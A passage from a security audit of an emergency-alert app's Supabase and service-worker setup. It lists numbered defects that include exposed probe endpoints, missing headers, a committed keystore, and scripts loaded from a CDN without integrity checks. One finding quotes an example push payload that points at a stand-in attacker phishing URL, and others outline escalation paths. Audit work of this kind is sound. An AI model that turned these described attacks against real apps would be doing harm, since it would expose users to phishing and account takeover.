  `twilio-config-probe`, `sos-inbound-probe`, `forgery-probe`, `sos-dispatch-probe`, `sos-load-probe`, `stripe-webhook-test-probe`, `stripe-e2e-test-probe`, `stripe-e2e-stress-probe` are all `verify_jwt = false` and rely on PROBE_SECRET. If PROBE_SECRET ever leaks (env file commit, CI logs), an attacker can run forgery, load-test, or stress-test functions that perform sign-in-as-probe-user AND DB writes — a privilege-escalation primitive.
  Root cause / Fix: Restrict probe endpoints by IP allowlist (CF Pages / Supabase Network Restrictions) in addition to PROBE_SECRET; rotate PROBE_SECRET often.

- **R-1978 — P2 — No `[db.pooler]` Settings → Default Connection Limits — supabase/config.toml:8-11**
  Defaults for connection pooling may allow connection exhaustion under SOS-burst (many simultaneous SOS pushes opening function instances), causing DB-side failure mid-emergency.
  Root cause / Fix: Set `[db.pooler] pool_mode = "transaction"` and explicit `max_client_conn`.

- **R-1979 — P2 — `[functions.sos-alert]` Has No Inline Comment Justifying verify_jwt=false — supabase/config.toml:31-32**
  Unlike Twilio/Stripe entries (lines 23-28, 52-55), `sos-alert` has zero comment. Reviewer cannot tell whether this is intentional or an unverified copy-paste. The SOS fan-out endpoint deserves the most scrutiny.
  Root cause / Fix: Document the auth model OR enable verify_jwt.

- **R-1980 — P3 — `port = 54321/54322/54320/54323` Hardcoded — supabase/config.toml:3,9,10,15**
  Hardcoded ports mean two parallel dev instances cannot run; minor DX issue. Not a security risk on its own but encourages devs to disable services rather than reconfigure.
  Root cause / Fix: Use env interpolation.

---

## SUMMARY

**Total defects:** 80 (R-1901 → R-1980)
- **P0:** 14
- **P1:** 31
- **P2:** 30
- **P3:** 5

---

## TOP 5 P0 TICKETS (verbatim)

1. **R-1901 — P0 — Missing Security Headers (no CSP/HSTS/XFO/Permissions-Policy) — public/_headers:1-5**
   The entire `_headers` file contains ONLY Content-Type overrides for `/assets/*.js` and `/assets/*.css`. There is no `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, or `Cross-Origin-*` policies for ANY route.

2. **R-1913 — P0 — Fingerprint Likely Belongs to Committed Keystore (R-1792 Cross-Reference) — public/.well-known/assetlinks.json:10**
   Cross-reference to R-1792: keystore password is committed in repo. If the SHA-256 above corresponds to the in-repo keystore, ANY contributor can sign a malicious APK whose package_name == `com.sosphere.app` AND whose fingerprint matches this entry → Android will accept it as the legitimate first-party handler of `https://sosphere.co/*` deep links, intercepting OAuth callbacks, password resets, magic links, and SOS deep-links.

3. **R-1938 — P0 — `importScripts` From `gstatic.com` With No SRI — public/firebase-messaging-sw.js:19-20**
   `firebase-app-compat.js` and `firebase-messaging-compat.js` are loaded from third-party CDN with NO integrity hash. If gstatic is compromised or MITM'd (no HSTS — R-1903), attacker controls the SW with full notification + cache + network interception powers on every user's device, persistently.

4. **R-1923 — P0 — Push Handler Trusts Server-Provided `url` Without Origin Validation — public/sw.js:196,212-218**
   `data.url` from push payload is used directly as `targetUrl` for `openWindow(targetUrl)` / `client.navigate`. Compromised FCM key or rogue tenant can send `url: "https://attacker.example/phish"` and the SW will open that URL when the user taps a notification — phishing the SOS user during an emergency.

5. **R-1971 — P0 — 14 Edge Functions With `verify_jwt = false` Including sos-alert — supabase/config.toml:22-111**
   `sos-alert` (line 31-32) is the SOS fan-out endpoint with `verify_jwt = false` AND no inline justification comment. If the in-function auth has any bug, anyone on the internet can trigger SOS fan-out (SMS/voice spam → notification fatigue → real SOS missed). Same pattern across 13 other functions including probe endpoints that hold a sign-in-as primitive.
